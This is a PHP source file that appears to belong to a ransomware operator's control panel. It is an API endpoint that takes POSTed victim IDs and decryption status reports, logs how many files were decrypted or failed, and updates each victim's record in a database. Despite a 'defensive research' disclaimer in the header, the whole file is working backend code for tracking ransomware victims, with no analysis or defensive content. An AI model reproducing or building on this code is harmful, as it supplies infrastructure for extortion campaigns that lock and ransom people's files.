<?php
/**
 * Decryption Status Notification API
 * Receives status updates from decryption process
 * For defensive cybersecurity research purposes only
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

require_once '../database.php';

try {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        throw new Exception("Only POST method allowed");
    }
    
    $victim_id = $_POST['victim_id'] ?? '';
    $status = $_POST['status'] ?? '';
    
    if (empty($victim_id) || empty($status)) {
        throw new Exception("Missing required parameters");
    }
    
    $db = new Database();
    
    switch ($status) {
        case 'started':
            $file_count = intval($_POST['file_count'] ?? 0);
            
            $db->updateDecryptionStatus($victim_id, 'decryption_started', [
                'files_to_decrypt' => $file_count,
                'started_at' => date('Y-m-d H:i:s')
            ]);
            
            error_log("Decryption started for victim $victim_id: $file_count files");
            
            echo json_encode([
                'success' => true,
                'message' => 'Decryption start logged',
                'victim_id' => $victim_id,
                'file_count' => $file_count
            ]);
            break;
            
        case 'completed':
            $success_count = intval($_POST['success'] ?? 0);
            $failure_count = intval($_POST['failures'] ?? 0);
            
            $db->updateDecryptionStatus($victim_id, 'decryption_completed', [
                'files_decrypted' => $success_count,
                'files_failed' => $failure_count,
                'completed_at' => date('Y-m-d H:i:s'),
                'success_rate' => $success_count > 0 ? ($success_count / ($success_count + $failure_count)) * 100 : 0
            ]);
            
            // Update victim status
            $db->updateVictimStatus($victim_id, 'files_decrypted');
            
            error_log("Decryption completed for victim $victim_id: $success_count success, $failure_count failures");
            
            echo json_encode([
                'success' => true,
                'message' => 'Decryption completion logged',
                'victim_id' => $victim_id,
                'files_decrypted' => $success_count,
                'files_failed' => $failure_count
            ]);
            break;
            
        default:
            throw new Exception("Invalid status: $status");
    }
    
} catch (Exception $e) {
    error_log("Decryption notification error: " . $e->getMessage());
    
    echo json_encode([
        'success' => false,
        'error' => 'Notification system error',
        'details' => $e->getMessage(),
        'timestamp' => time()
    ]);
}
?>